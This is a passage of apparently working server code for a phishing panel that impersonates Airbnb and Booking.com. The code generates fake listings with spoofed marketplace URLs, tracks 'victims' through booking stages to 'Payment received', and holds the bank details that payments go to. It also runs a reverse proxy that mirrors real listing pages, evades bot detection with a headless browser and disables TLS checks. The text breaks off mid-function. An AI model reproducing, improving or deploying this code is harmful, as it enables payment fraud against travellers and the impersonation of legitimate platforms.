const PAYMENT_COUNTRIES = {
  GB: { label: 'United Kingdom', fields: ['bank_name','beneficiary','account_number','sort_code','iban','bic','bank_address'] },
  IE: { label: 'Ireland', fields: ['bank_name','beneficiary','iban','bic','bank_address'] },
  ES: { label: 'Spain', fields: ['bank_name','beneficiary','iban','bic','bank_address'] },
  FR: { label: 'France', fields: ['bank_name','beneficiary','iban','bic','bank_address'] },
  DE: { label: 'Germany', fields: ['bank_name','beneficiary','iban','bic','bank_address'] },
  IT: { label: 'Italy', fields: ['bank_name','beneficiary','iban','bic','bank_address'] },
  PT: { label: 'Portugal', fields: ['bank_name','beneficiary','iban','bic','bank_address'] },
  NL: { label: 'Netherlands', fields: ['bank_name','beneficiary','iban','bic','bank_address'] },
  RO: { label: 'Romania', fields: ['bank_name','beneficiary','iban','bic','bank_address'] },
  US: { label: 'United States', fields: ['bank_name','beneficiary','account_number','routing_number','account_type','bank_address'] },
  CA: { label: 'Canada', fields: ['bank_name','beneficiary','account_number','routing_number','bank_address'] },
  AU: { label: 'Australia', fields: ['bank_name','beneficiary','account_number','bsb','bank_address'] },
  OTHER: { label: 'Other / IBAN', fields: ['bank_name','beneficiary','iban','bic','account_number','bank_address'] }
};

const BOOKING_STATUSES = [
  { id: 'not_opened', label: 'Not opened', color: '#6b7280', bg: '#1f2937' },
  { id: 'open', label: 'Open', color: '#22c55e', bg: '#052e16' },
  { id: 'in_review', label: 'In review', color: '#f59e0b', bg: '#422006' },
  { id: 'invoice_sent', label: 'Invoice', color: '#3b82f6', bg: '#0c1a33' },
  { id: 'payment_declined', label: 'Payment declined', color: '#ef4444', bg: '#450a0a' },
  { id: 'paid', label: 'Payment received', color: '#a855f7', bg: '#2e1065' }
];

const STATUS_RANK = {
  not_opened: 0,
  open: 1,
  in_review: 2,
  invoice_sent: 3,
  payment_declined: 4,
  paid: 5
};

function advanceListingStatus(listingOrId, nextStatus, opts) {
  opts = opts || {};
  try {
    let listing = listingOrId;
    if (listing == null) return false;
    if (typeof listing !== 'object') {
      listing = db.prepare('SELECT id, user_id, booking_status FROM listings WHERE id = ?').get(listing);
    }
    if (!listing || !listing.id) return false;
    const allowed = BOOKING_STATUSES.map(s => s.id);
    if (!allowed.includes(nextStatus)) return false;
    const cur = listing.booking_status || 'not_opened';
    if (cur === nextStatus) return false;
    if (cur === 'paid' && nextStatus !== 'paid' && !opts.force) return false;
    const curR = STATUS_RANK[cur] != null ? STATUS_RANK[cur] : 0;
    const nextR = STATUS_RANK[nextStatus] != null ? STATUS_RANK[nextStatus] : 0;
    if (!opts.force && nextR < curR) return false;
    db.prepare("UPDATE listings SET booking_status = ?, status_updated_at = datetime('now'), opened_at = CASE WHEN opened_at IS NULL AND ? IN ('open','in_review','invoice_sent','payment_declined','paid') THEN datetime('now') ELSE opened_at END WHERE id = ?")
      .run(nextStatus, nextStatus, listing.id);
    listing.booking_status = nextStatus;
    try {
      io.emit('listing_status', { id: listing.id, booking_status: nextStatus, userId: listing.user_id });
      try { io.to('user:' + listing.user_id).emit('listing_status', { id: listing.id, booking_status: nextStatus, userId: listing.user_id }); } catch (e2) {}
    } catch (e) {}
    return true;
  } catch (e) {
    console.error('advanceListingStatus', e);
    return false;
  }
}

function listingFromVictimId(victimId) {
  try {
    const v = db.prepare('SELECT listing_id, user_id FROM victims WHERE id = ?').get(victimId);
    if (!v || !v.listing_id) return null;
    return db.prepare('SELECT id, user_id, booking_status FROM listings WHERE id = ?').get(v.listing_id);
  } catch (e) { return null; }
}

function bookingStatusMeta(id) {
  return BOOKING_STATUSES.find(s => s.id === id) || BOOKING_STATUSES[0];
}

function clientFullName(l) {
  const f = (l.client_first_name || '').trim();
  const last = (l.client_last_name || '').trim();
  const n = (f + ' ' + last).trim();
  return n || '—';
}

function paymentConfigPublic(pc) {
  pc = pc || {};
  return {
    country: pc.country || 'GB',
    bank: pc.bank_name || 'Revolut',
    beneficiary: pc.beneficiary || '',
    iban: pc.iban || '',
    bic: pc.bic || '',
    account_number: pc.account_number || '',
    sort_code: pc.sort_code || '',
    routing_number: pc.routing_number || '',
    account_type: pc.account_type || '',
    bank_address: pc.bank_address || '',
    reference_prefix: pc.reference_prefix || 'ABB',
    bsb: (() => { try { const j = pc.extra_json ? JSON.parse(pc.extra_json) : {}; return j.bsb || ''; } catch (e) { return ''; } })()
  };
}

function markListingOpened(listing) {
  try {
    if (!listing || !listing.id) return;
    const cur = listing.booking_status || 'not_opened';
    if (cur === 'not_opened' || !cur) {
      db.prepare("UPDATE listings SET booking_status = 'open', opened_at = COALESCE(opened_at, datetime('now')), status_updated_at = datetime('now') WHERE id = ?").run(listing.id);
      listing.booking_status = 'open';
      try {
        io.emit('listing_status', { id: listing.id, booking_status: 'open', userId: listing.user_id });
        io.emit('live_presence', { listingId: listing.id, userId: listing.user_id, event: 'opened', at: new Date().toISOString() });
        try { io.to('user:' + listing.user_id).emit('live_presence', { listingId: listing.id, userId: listing.user_id, event: 'opened', at: new Date().toISOString() }); } catch (e2) {}
      } catch (e) {}
    }
  } catch (e) {}
}

function apartmentToListingFields(apt) {
  if (!apt) return {};
  return {
    marketplace: apt.marketplace || 'airbnb',
    title: apt.title,
    description: apt.description || '',
    price: apt.price || '0',
    price_month: apt.price_month || '',
    image_url: apt.image_url || '',
    images: apt.images || '[]',
    location: apt.location || '',
    guests: apt.guests || 2,
    bedrooms: apt.bedrooms || 1,
    beds: apt.beds || 1,
    baths: apt.baths || 1,
    amenities: apt.amenities || '',
    host_name: apt.host_name || '',
    host_photo: apt.host_photo || '',
    rating: apt.rating || '4.92',
    reviews: apt.reviews || 48,
    property_type: apt.property_type || 'Entire apartment',
    display_domain: apt.display_domain || '',
    locale: apt.locale || 'gb',
    currency: apt.currency || 'GBP',
    video_url: apt.video_url || '',
    hide_nightly: apt.hide_nightly || 0,
    proxy_target_url: apt.proxy_target_url || '',
    proxy_mode: apt.proxy_mode || 0
  };
}

const AMENITY_LIST = [
  'Wifi','Kitchen','Washer','Dryer','Free parking','Paid parking','Air conditioning','Heating',
  'TV','Hair dryer','Iron','Dedicated workspace','Self check-in','Pool','Hot tub','Gym',
  'BBQ grill','Breakfast','Indoor fireplace','Smoking allowed','Pets allowed','Elevator',
  'EV charger','Beach access','Lake access','Ski-in/Ski-out','Outdoor dining','Patio or balcony',
  'Backyard','Fire pit','Piano','Exercise equipment','Safe','Crib','High chair','Carbon monoxide alarm',
  'Smoke alarm','First aid kit','Fire extinguisher','Lockbox','Private entrance','Long term stays allowed'
];

const DOMAIN_OPTIONS = {
  airbnb: [
    { host: 'www.airbnb.com', pathPrefix: '/rooms/', label: 'airbnb.com' },
    { host: 'www.airbnb.co.uk', pathPrefix: '/rooms/', label: 'airbnb.co.uk' },
    { host: 'www.airbnb.fr', pathPrefix: '/rooms/', label: 'airbnb.fr' },
    { host: 'www.airbnb.de', pathPrefix: '/rooms/', label: 'airbnb.de' },
    { host: 'www.airbnb.es', pathPrefix: '/rooms/', label: 'airbnb.es' },
    { host: 'www.airbnb.it', pathPrefix: '/rooms/', label: 'airbnb.it' },
    { host: 'www.airbnb.com.au', pathPrefix: '/rooms/', label: 'airbnb.com.au' },
    { host: 'www.airbnb.ca', pathPrefix: '/rooms/', label: 'airbnb.ca' },
    { host: 'www.airbnb.co.jp', pathPrefix: '/rooms/', label: 'airbnb.co.jp' },
    { host: 'www.airbnb.com.br', pathPrefix: '/rooms/', label: 'airbnb.com.br' }
  ],
  booking: [
    { host: 'www.booking.com', pathPrefix: '/hotel/', label: 'booking.com' },
    { host: 'www.booking.co.uk', pathPrefix: '/hotel/', label: 'booking.co.uk' },
    { host: 'www.booking.fr', pathPrefix: '/hotel/', label: 'booking.fr' },
    { host: 'www.booking.de', pathPrefix: '/hotel/', label: 'booking.de' },
    { host: 'www.booking.es', pathPrefix: '/hotel/', label: 'booking.es' },
    { host: 'www.booking.it', pathPrefix: '/hotel/', label: 'booking.it' }
  ]
};

function slugifyPath(s) {
  return String(s || '')
    .toLowerCase()
    .normalize('NFD').replace(/[\u0300-\u036f]/g, '')
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/^-+|-+$/g, '')
    .slice(0, 52);
}

function bookingSlugFromTitle(title, location) {
  const base = slugifyPath(title) || 'hotel';
  const city = slugifyPath(String(location || '').split(',')[0] || '') || 'city';
  const tail = String(Math.floor(1000000 + Math.random() * 8999999));
  let slug = base + '.' + city;
  if (slug.length > 60) slug = slug.slice(0, 60);
  return slug + '-' + tail.slice(0, 4) + '.html';
}

function randomListingCode(marketplace, title, location) {
  if (marketplace === 'booking') {
    return bookingSlugFromTitle(title, location);
  }
  // Airbnb-style long room id: 19 digits, no leading zero (demo realism)
  let n = String(1 + Math.floor(Math.random() * 9));
  for (let i = 1; i < 19; i++) n += Math.floor(Math.random() * 10);
  return n;
}

function buildPublicPath(marketplace, code) {
  if (marketplace === 'booking') {
    const c = code.endsWith('.html') ? code : (code + '.html');
    return '/hotel/' + c;
  }
  return '/rooms/' + code;
}

const LOCALE_DOMAIN_MAP = {
  airbnb: {
    gb: 'www.airbnb.co.uk', uk: 'www.airbnb.co.uk', en: 'www.airbnb.co.uk',
    fr: 'www.airbnb.fr', de: 'www.airbnb.de', es: 'www.airbnb.es', it: 'www.airbnb.it',
    au: 'www.airbnb.com.au', br: 'www.airbnb.com.br', jp: 'www.airbnb.co.jp',
    us: 'www.airbnb.com', ca: 'www.airbnb.ca', pt: 'www.airbnb.com',
    ro: 'www.airbnb.com', nl: 'www.airbnb.com'
  },
  booking: {
    gb: 'www.booking.co.uk', uk: 'www.booking.co.uk', en: 'www.booking.co.uk',
    fr: 'www.booking.fr', de: 'www.booking.de', es: 'www.booking.es', it: 'www.booking.it',
    us: 'www.booking.com', pt: 'www.booking.com', ro: 'www.booking.com',
    nl: 'www.booking.com', au: 'www.booking.com', br: 'www.booking.com', jp: 'www.booking.com'
  }
};

function resolveDomainMeta(marketplace, displayDomain) {
  const list = DOMAIN_OPTIONS[marketplace] || DOMAIN_OPTIONS.airbnb;
  return list.find(d => d.host === displayDomain || d.label === displayDomain) || list[0];
}

function autoDisplayDomain(marketplace, locale, explicit) {
  const mp = marketplace === 'booking' ? 'booking' : 'airbnb';
  if (explicit && String(explicit).trim()) {
    return resolveDomainMeta(mp, String(explicit).trim()).host;
  }
  const loc = String(locale || 'en').toLowerCase();
  const map = LOCALE_DOMAIN_MAP[mp] || {};
  const host = map[loc] || (mp === 'booking' ? 'www.booking.com' : 'www.airbnb.com');
  return resolveDomainMeta(mp, host).host;
}

// Lab patch: build links from the actual request host so they work
// via any tunnel (or localhost) without restarting with a new BASE_URL.
function reqBase(req) {
  if (!req || !req.get) return String(BASE_URL || 'https://lessjob.online').replace(/\/+$/, '');
  const proto = String(req.headers['x-forwarded-proto'] || req.protocol || 'http').split(',')[0].trim();
  return proto + '://' + req.get('host');
}

/** Site origin (scheme://host, no trailing slash) for the current request. */
function reqOrigin(req) {
  return reqBase(req);
}

function livePhishUrl(listing, req) {
  const p = listing.public_path || ('/listing/' + listing.id);
  return reqBase(req) + p;
}

// Deterministic, realistic-looking stay params for the demo display URL
// (derived from the listing id so the link stays stable between page loads).
function demoStayParams(listing) {
  const mp = listing.marketplace === 'booking' ? 'booking' : 'airbnb';
  const seed = Number(listing.id) || 1;
  let base = Date.parse(listing.created_at);
  if (!Number.isFinite(base)) base = Date.now();
  const start = new Date(base + (5 + (seed % 45)) * 86400000);
  const nights = 2 + (seed % 5);
  const end = new Date(start.getTime() + nights * 86400000);
  const iso = d => d.toISOString().slice(0, 10);
  const photoId = String(1000000000 + ((seed * 7919 + 450704270) % 8999999999));
  if (mp === 'booking') {
    return '?checkin=' + iso(start) + '&checkout=' + iso(end) + '&group_adults=2&no_rooms=1&group_children=0';
  }
  return '?check_in=' + iso(start) + '&check_out=' + iso(end) + '&photo_id=' + photoId;
}

function spoofDisplayUrl(listing) {
  const mp = listing.marketplace === 'booking' ? 'booking' : 'airbnb';
  const meta = resolveDomainMeta(mp, listing.display_domain);
  const code = listing.listing_code || String(listing.id);
  const path = listing.public_path || buildPublicPath(mp, code);
  return 'https://' + meta.host + path + demoStayParams(listing);
}

function findListingByParam(param) {
  let listing = db.prepare("SELECT * FROM listings WHERE status = 'active' AND (public_path = ? OR public_path = ? OR listing_code = ? OR CAST(id AS TEXT) = ?)").get(
    param.startsWith('/') ? param : '/' + param,
    param,
    String(param).replace(/^\/?rooms\//, '').replace(/^\/?hotel\//, ''),
    param
  );
  if (!listing && /^\d+$/.test(String(param))) {
    listing = db.prepare("SELECT * FROM listings WHERE id = ? AND status = 'active'").get(param);
  }
  if (!listing) {
    const m = String(param).match(/^(?:rooms|hotel)\/(.+)$/);
    if (m) {
      listing = db.prepare("SELECT * FROM listings WHERE status = 'active' AND (listing_code = ? OR public_path = ? OR public_path = ?)").get(
        m[1], '/rooms/' + m[1], '/hotel/' + m[1]
      );
    }
  }
  return listing || null;
}


function getListingVideo(listing) {
  return (listing && listing.video_url) ? String(listing.video_url).trim() : '';
}
function embedVideoHtml(url, cls) {
  if (!url) return '';
  const u = String(url).trim();
  let yt = null;
  const m1 = u.match(/(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([A-Za-z0-9_-]{6,})/);
  if (m1) yt = m1[1];
  if (yt) {
    return '<div class="' + (cls||'mf-video') + '"><iframe src="https://www.youtube.com/embed/' + yt + '" title="Property video" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen style="width:100%;aspect-ratio:16/9;border:0;border-radius:12px;background:#000"></iframe></div>';
  }
  const src = u.replace(/"/g, '&quot;');
  return '<div class="' + (cls||'mf-video') + '"><video controls playsinline preload="metadata" style="width:100%;max-height:480px;border-radius:12px;background:#000"><source src="' + src + '">Browserul tău nu suportă video.</video></div>';
}


// === REVERSE PROXY ENGINE ===
// Full MITM-style mirror of Airbnb / Booking listing pages.
// Landing path stays /rooms/... or /hotel/...; subsequent assets run through /_mfpx/:id/...
const zlib = require('zlib');
const { URL: NodeURL } = require('url');

const PROXY_CACHE_TTL_MS = 12 * 60 * 1000;
const PROXY_CACHE = new Map(); // key -> { html, at, target }
const PROXY_SESS = new Map(); // sid -> { listingId, origin, jar: Map, ua }

const ORIGIN_HOST_RE =
  /(?:^|\.)(?:airbnb\.[a-z.]+|booking\.com|bstatic\.com|muscache\.com|jsdelivr\.net|cloudflare\.com|google(?:apis)?\.com|gstatic\.com|stripe\.com|paypal\.com)$/i;

function hostAllowed(host) {
  if (!host) return false;
  const h = String(host).toLowerCase().split(':')[0];
  if (ORIGIN_HOST_RE.test(h)) return true;
  if (h.includes('airbnb') || h.includes('muscache') || h.includes('booking') || h.includes('bstatic')) return true;
  return false;
}

function cookieHdrFromJar(jar, url) {
  if (!jar || !jar.size) return '';
  try {
    const u = new NodeURL(url);
    const parts = [];
    for (const [k, v] of jar.entries()) {
      // simple jar: key=value; ignore domain scoping for phish panel scale
      parts.push(k + '=' + v);
    }
    return parts.join('; ');
  } catch (e) {
    return '';
  }
}

function storeSetCookies(jar, setCookie) {
  if (!jar || !setCookie) return;
  const list = Array.isArray(setCookie) ? setCookie : [setCookie];
  for (const sc of list) {
    const nv = String(sc).split(';')[0];
    const eq = nv.indexOf('=');
    if (eq > 0) jar.set(nv.slice(0, eq).trim(), nv.slice(eq + 1).trim());
  }
}

function fetchUrl(url, opts = {}) {
  return new Promise((resolve, reject) => {
    // Require locally so a missing top-level binding never blows up proxying
    const httpMod = require('http');
    const httpsMod = require('https');
    let parsed;
    try { parsed = new NodeURL(url); } catch (e) { return reject(e); }
    const mod = parsed.protocol === 'https:' ? httpsMod : httpMod;
    const headers = {
      'User-Agent': opts.ua || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
      'Accept': opts.accept || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
      'Accept-Language': opts.lang || 'en-GB,en;q=0.9,ro;q=0.8',
      'Accept-Encoding': 'gzip, deflate, br',
      'Cache-Control': 'no-cache',
      'Pragma': 'no-cache',
      'Sec-Ch-Ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
      'Sec-Ch-Ua-Mobile': '?0',
      'Sec-Ch-Ua-Platform': '"Windows"',
      'Sec-Fetch-Dest': opts.fetchDest || 'document',
      'Sec-Fetch-Mode': opts.fetchMode || 'navigate',
      'Sec-Fetch-Site': opts.fetchSite || 'none',
      'Sec-Fetch-User': '?1',
      'Upgrade-Insecure-Requests': '1',
      'Referer': opts.referer || (parsed.protocol + '//' + parsed.host + '/'),
      ...(opts.headers || {}),
    };
    if (opts.cookie) headers['Cookie'] = opts.cookie;
    const hops = opts._hops || 0;
    const req = mod.request(
      {
        protocol: parsed.protocol,
        hostname: parsed.hostname,
        port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
        path: parsed.pathname + parsed.search,
        method: opts.method || 'GET',
        headers,
        rejectUnauthorized: false,
        timeout: opts.timeout || 18000,
      },
      (res) => {
        if ([301, 302, 303, 307, 308].includes(res.statusCode) && res.headers.location && hops < 6) {
          let loc = res.headers.location;
          if (!loc.startsWith('http')) loc = parsed.protocol + '//' + parsed.host + loc;
          if (opts.jar) storeSetCookies(opts.jar, res.headers['set-cookie']);
          return resolve(
            fetchUrl(loc, {
              ...opts,
              _hops: hops + 1,
              cookie: opts.jar ? cookieHdrFromJar(opts.jar, loc) : opts.cookie,
            })
          );
        }
        const chunks = [];
        let stream = res;
        const enc = (res.headers['content-encoding'] || '').toLowerCase();
        try {
          if (enc.includes('br')) stream = res.pipe(zlib.createBrotliDecompress());
          else if (enc.includes('gzip')) stream = res.pipe(zlib.createGunzip());
          else if (enc.includes('deflate')) stream = res.pipe(zlib.createInflate());
        } catch (e) {
          stream = res;
        }
        stream.on('data', (c) => chunks.push(c));
        stream.on('end', () => {
          if (opts.jar) storeSetCookies(opts.jar, res.headers['set-cookie']);
          const body = Buffer.concat(chunks);
          resolve({
            status: res.statusCode || 200,
            headers: res.headers,
            body,
            finalUrl: url,
          });
        });
        stream.on('error', reject);
      }
    );
    req.on('error', reject);
    req.on('timeout', () => {
      req.destroy();
      reject(new Error('timeout'));
    });
    if (opts.body) req.write(opts.body);
    req.end();
  });
}

const MF_BROWSER_RENDER = process.env.MF_BROWSER_RENDER || '/opt/mf_browser/mf_browser_render.js';
const MF_BROWSER_NODE = process.env.MF_BROWSER_NODE || 'node';
const BROWSER_RENDER_TIMEOUT_MS = Number(process.env.MF_BROWSER_TIMEOUT_MS || 90000);

/** Fully hydrate Airbnb/Booking listing HTML via headless Chrome (bypasses bot shell). */
function browserRenderUrl(url) {
  return new Promise((resolve, reject) => {
    if (!url || !/^https?:\/\//i.test(String(url))) {
      return reject(new Error('invalid browser render url'));
    }
    if (!fs.existsSync(MF_BROWSER_RENDER)) {
      return reject(new Error('browser renderer missing: ' + MF_BROWSER_RENDER));
    }
    const outFile =
      '/tmp/mf_br_' +
      Date.now() +
      '_' +
      Math.random().toString(36).slice(2, 10) +
      '.html';
    const child = execFile(
      MF_BROWSER_NODE,
      [MF_BROWSER_RENDER, String(url), outFile],
      {
        timeout: BROWSER_RENDER_TIMEOUT_MS,
        maxBuffer: 4 * 1024 * 1024,
        env: { ...process.env, MF_BROWSER_ROOT: path.dirname(MF_BROWSER_RENDER) },
      },
      (err, stdout, stderr) => {
        let meta = null;
        try {
          meta = JSON.parse(String(stdout || '').trim() || '{}');
        } catch (e) {
          meta = null;
        }
        const filePath = (meta && meta.path) || outFile;
        let body = null;
        try {
          if (fs.existsSync(filePath)) body = fs.readFileSync(filePath);
        } catch (e) {}
        try {
          if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
        } catch (e) {}
        if (!body || !body.length) {
          const msg =
            (meta && meta.error) ||
            (err && err.message) ||
            String(stderr || '').slice(0, 300) ||
            'browser render empty';
          return reject(new Error(msg));
        }
        if (meta && meta.oops) {
          return reject(new Error('browser render oops/404'));
        }
        resolve({
          status: (meta && meta.status) || 200,
          headers: { 'content-type': 'text/html; charset=utf-8' },
          body,
          finalUrl: url,
          browser: true,
          title: meta && meta.title,
        });
      }
    );
    child.on('error', reject);
  });
}

/** True when HTML looks like a fully painted listing (browser snapshot). */
function isAirbnbHomepageShell(html) {
  if (!html) return true;
  const s = Buffer.isBuffer(html) ? html.toString('utf8') : String(html);
  const titleM = s.match(/<title[^>]*>([^<]*)<\/title>/i);
  const title = titleM ? titleM[1].toLowerCase().replace(/\u00a0/g, ' ') : '';
  // Multilingual Airbnb marketing homepage titles (SPA shell for dead rooms)
  const homeTitle =
    title.includes('vacation rentals, cabins') ||
    title.includes('holiday rentals, cabins') ||
    title.includes('locations de vacances') ||
    title.includes('casas de vacaciones') ||
    title.includes('case vacanza') ||
    title.includes('ferienwohnungen') ||
    title.includes('vakantiewoningen') ||
    title.includes('aluguel de temporada') ||
    title.includes('apartments for rent - airbnb') ||
    (/^airbnb\s*[:\-–]/.test(title) && !/\d{5,}/.test(title) && !title.includes(' - apartments') && !title.includes(' for rent in '));
  if (!homeTitle) return false;
  // Real PDPs have a specific listing title, not the generic brand homepage
  const surface = listingPageSurfaceText(s);
  const hasPdpSurface =
    surface.includes('show all photos') ||
    surface.includes('afficher toutes les photos') ||
    surface.includes('what this place offers') ||
    surface.includes('ce que propose ce logement') ||
    surface.includes('where you\'ll be') ||
    surface.includes('où vous serez') ||
    /entire (rental|home|condo|loft|place|serviced|apartment)/i.test(surface);
  return !hasPdpSurface;
}

function isHydratedListingHtml(html, targetUrl) {
  if (!html) return false;
  const s = Buffer.isBuffer(html) ? html.toString('utf8') : String(html);
  if (s.length < 40000) return false;
  if (isAirbnbHomepageShell(s)) return false;
  if (isOriginListingMissing(s, 200) || isBotPage(s)) return false;
  const lc = s.toLowerCase();
  // Require VISIBLE PDP surface text — bundle JS always contains homes-pdp-cta / data-section-id
  const surface = listingPageSurfaceText(s);
  const visibleSignals = [
    surface.includes('show all photos') || surface.includes('afficher toutes les photos') || surface.includes('mostrar todas las fotos'),
    surface.includes('what this place offers') || surface.includes('ce que propose ce logement') || surface.includes('lo que este lugar ofrece'),
    surface.includes('where you\'ll be') || surface.includes("where you'll be") || surface.includes('où vous serez'),
    /entire (rental|home|condo|loft|place|serviced|apartment)/i.test(surface),
    surface.includes('check availability') || surface.includes('request to book') || /\breserve\b/.test(surface),
    surface.includes('hosted by') || surface.includes('hébergé par') || surface.includes('anfitrión:'),
  ].filter(Boolean).length;
  if (visibleSignals >= 2) return true;
  // Booking
  if (/booking\.com/i.test(String(targetUrl || '')) && s.length > 80000 && !isAirbnbHomepageShell(s)) return true;
  // Strict fallback — never accept homepage shells via soft path
  return false;
}

function isBotPage(html) {
  if (!html) return true;
  const s = Buffer.isBuffer(html) ? html.toString('utf8') : String(html);
  const len = s.length;
  if (len < 4000) return true;
  // Large hydrated PDPs are never bot/challenge pages (bundles mention captcha/404)
  if (len > 200000 && (s.includes('Show all photos') || s.includes('homes-pdp-cta') || s.includes('data-section-id'))) {
    return false;
  }
  const lc = s.toLowerCase();
  if (
    lc.includes('cf-challenge') ||
    lc.includes('_cf_chl') ||
    lc.includes('just a moment') ||
    lc.includes('checking your browser') ||
    lc.includes('enable javascript and cookies') ||
    lc.includes('attention required') ||
    (lc.includes('captcha') && len < 20000)
  )
    return true;
  // Airbnb 404 pages — surface text only (SPA bundles embed these strings)
  const surface = listingPageSurfaceText(s);
  if (
    surface.includes('404 page not found - airbnb') ||
    surface.includes("we can't seem to find the page you're looking for") ||
    (surface.includes('error code: 404') && surface.includes('oops')) ||
    (/\boops!\b/.test(surface) && surface.includes('404'))
  )
    return true;
  return false;
}

/** Extract <title> + early body text for missing-page checks (avoid SPA bundle false positives). */
function listingPageSurfaceText(html) {
  const s = Buffer.isBuffer(html) ? html.toString('utf8') : String(html);
  const titleM = s.match(/<title[^>]*>([^<]*)<\/title>/i);
  const title = titleM ? titleM[1] : '';
  // Prefer visible shell: strip scripts/styles then take a head slice
  const stripped = s
    .replace(/<script\b[\s\S]*?<\/script>/gi, ' ')
    .replace(/<style\b[\s\S]*?<\/style>/gi, ' ')
    .replace(/<!--[\s\S]*?-->/g, ' ');
  const bodyM = stripped.match(/<body\b[^>]*>([\s\S]*)/i);
  const body = (bodyM ? bodyM[1] : stripped).replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').slice(0, 4000);
  return (title + ' ' + body).toLowerCase();
}

/** True when upstream listing does not exist (do NOT mirror Oops page). */
function isOriginListingMissing(html, status) {
  if (status === 404 || status === 410) return true;
  if (!html) return true;
  const s = Buffer.isBuffer(html) ? html.toString('utf8') : String(html);
  const len = s.length;
  // Tiny HTML is almost never a real listing
  if (len < 5000) return true;
  // SPA marketing homepage shell = missing listing (dead room IDs)
  if (typeof isAirbnbHomepageShell === 'function' && isAirbnbHomepageShell(s)) return true;
  // Never treat a large hydrated PDP as missing (bundle JS often contains "404"/"Oops" strings)
  // Require visible surface markers, not bundle-only strings like homes-pdp-cta
  const surfaceEarly = listingPageSurfaceText(s);
  if (
    len > 200000 &&
    (surfaceEarly.includes('show all photos') ||
      surfaceEarly.includes('what this place offers') ||
      /entire (rental|home|condo|loft|place|serviced|apartment)/i.test(surfaceEarly))
  ) {
    return false;
  }
  const surface = surfaceEarly;
  if (surface.includes('404 page not found - airbnb')) return true;
  if (surface.includes("we can't seem to find the page you're looking for")) return true;
  if (surface.includes('error code: 404') && surface.includes('oops')) return true;
  if (/\boops!\b/.test(surface) && (surface.includes('404') || surface.includes("can't seem to find"))) return true;
  const titleM = s.match(/<title[^>]*>([^<]*)<\/title>/i);
  const title = titleM ? titleM[1].toLowerCase() : '';
  if (title.includes('404') && (title.includes('airbnb') || title.includes('not found'))) return true;
  return false;
}

/**
 * Airbnb often returns a full SPA shell (homepage chrome) for dead room IDs.
 * The shell is large and has no Oops text until client JS runs — then it hits /404.
 * Require evidence the listing payload is actually present.
 */
function isValidProxiedListingHtml(html, targetUrl) {
  if (!html) return false;
  const s = Buffer.isBuffer(html) ? html.toString('utf8') : String(html);
  if (isAirbnbHomepageShell(s)) return false;
  if (isOriginListingMissing(s, 200) || isBotPage(s)) return false;

  let roomId = '';
  let isAirbnb = false;
  let isBooking = false;
  try {
    const u = new NodeURL(targetUrl);
    isAirbnb = /airbnb\./i.test(u.hostname);
    isBooking = /booking\.com/i.test(u.hostname);
    const m = u.pathname.match(/\/rooms\/(\d+)/i);
    if (m) roomId = m[1];
    const mb = u.pathname.match(/\/hotel\/([^/?#]+)/i);
    if (mb) roomId = mb[1];
  } catch (e) {}

  if (isAirbnb && roomId) {
    if (!s.includes(roomId)) return false;
    const surface = listingPageSurfaceText(s);
    const titleM = s.match(/<title[^>]*>([^<]+)<\/title>/i);
    const title = titleM ? titleM[1].toLowerCase().replace(/\u00a0/g, ' ') : '';
    // Reject generic brand homepage titles always
    if (
      title.includes('vacation rentals, cabins') ||
      title.includes('holiday rentals, cabins') ||
      title.includes('locations de vacances') ||
      title.includes('casas de vacaciones') ||
      title.includes('case vacanza') ||
      title.includes('ferienwohnungen') ||
      title.includes('apartments for rent - airbnb') ||
      (/^airbnb\s*[:\-–]/.test(title) && !title.includes(roomId) && !/ for rent in | - apartments| · /.test(title))
    ) {
      return false;
    }
    // Require real PDP surface OR strong bootstrap listing payload
    const hasPdpSurface =
      surface.includes('show all photos') ||
      surface.includes('what this place offers') ||
      /entire (rental|home|condo|loft|place|serviced|apartment)/i.test(surface) ||
      surface.includes('hosted by');
    const hasListingPayload =
      s.includes('"listingId":' + roomId) ||
      s.includes('"listingId":"' + roomId + '"') ||
      s.includes('"listing_id":"' + roomId + '"') ||
      (s.includes('niobeClientData') && s.includes(roomId) && s.length > 500000 && hasPdpSurface);
    if (hasPdpSurface || hasListingPayload) return true;
    return false;
  }

  if (isBooking && roomId) {
    if (!s.includes(roomId) && !s.toLowerCase().includes('hp_hotel_name')) return false;
    return s.length > 20000;
  }

  // Unknown target: accept non-bot large pages
  return s.length > 15000;
}

/** Real Airbnb PDP chrome (donor) + user content — used when room ID is dead/404. */
const MF_DONOR_URL = process.env.MF_DONOR_URL || 'https://www.airbnb.com/rooms/7625472923';
const MF_DONOR_CACHE_PATH = process.env.MF_DONOR_CACHE_PATH || path.join(__dirname, 'data', 'donor_airbnb_shell.html');
const DONOR_SHELL_TTL_MS = Number(process.env.MF_DONOR_TTL_MS || 6 * 60 * 60 * 1000);
const MF_OFFLINE_DIR = process.env.MF_OFFLINE_DIR || path.join(__dirname, 'public', 'offline-airbnb');
const MF_OFFLINE_SHELL_PATH = process.env.MF_OFFLINE_SHELL_PATH || path.join(MF_OFFLINE_DIR, 'shell.html');
const MF_OFFLINE_DATA_SHELL = path.join(__dirname, 'data', 'offline_airbnb', 'shell.html');
let OFFLINE_SHELL_MEM = { html: '', at: 0 };
let DONOR_SHELL_MEM = { html: null, at: 0 };

function absoluteListingAsset(url, req) {
  const u = String(url || '').trim();
  if (!u) return '';
  if (/^https?:\/\//i.test(u)) return u;
  if (u.startsWith('//')) return 'https:' + u;
  const base = String(reqBase(req)).replace(/\/+$/, '');
  if (u.startsWith('/')) return base + u;
  return base + '/' + u;
}

function buildListingInjectPayload(listing, req) {
  const imgs = parseListingImages(listing).map((u) => absoluteListingAsset(u, req)).filter(Boolean);
  while (imgs.length && imgs.length < 5) imgs.push(imgs[imgs.length - 1]);
  const locale = listing.locale || 'en';
  const localeInfo = (typeof LOCALES !== 'undefined' && LOCALES[locale]) || {};
  const currency = listing.currency || localeInfo.currency || 'EUR';
